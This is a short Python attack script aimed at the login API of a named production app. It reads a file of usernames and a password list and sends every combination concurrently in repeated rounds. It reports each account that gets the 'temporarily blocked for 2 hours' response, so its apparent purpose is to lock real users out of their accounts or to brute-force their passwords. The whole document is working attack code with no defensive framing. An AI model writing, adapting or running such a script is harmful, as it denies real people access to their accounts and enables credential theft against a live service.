import time

import requests
import concurrent.futures

user_file = input("Enter the user file: ")
num_requests = int(input("Enter the number of time to send(each time 2 hours block) : "))

url = 'https://production.api.ezygo.app/api/v1/Xcr45_salt/login'

with open(user_file, 'r') as f:
    usernames = [line.strip() for line in f]

with open('pass.txt', 'r') as f:
    passwords = [line.strip() for line in f]

def send_request(user, pwd):
    data = {'username': user, 'password': pwd}
    response = requests.post(url, json=data)
    if "Your account has been temporarly blocked" in response.text:
        print(f' {user} : Your account has been temporarly blocked for 2 houres')

for i in range(num_requests):
    print(f"Sending request {i+1}/{num_requests}")
    print("----------------------------------------------------------------------------------------")
    time.sleep(1)
    with concurrent.futures.ThreadPoolExecutor() as executor:
        for user in usernames:
            for pwd in passwords:
                executor.submit(send_request, user, pwd)
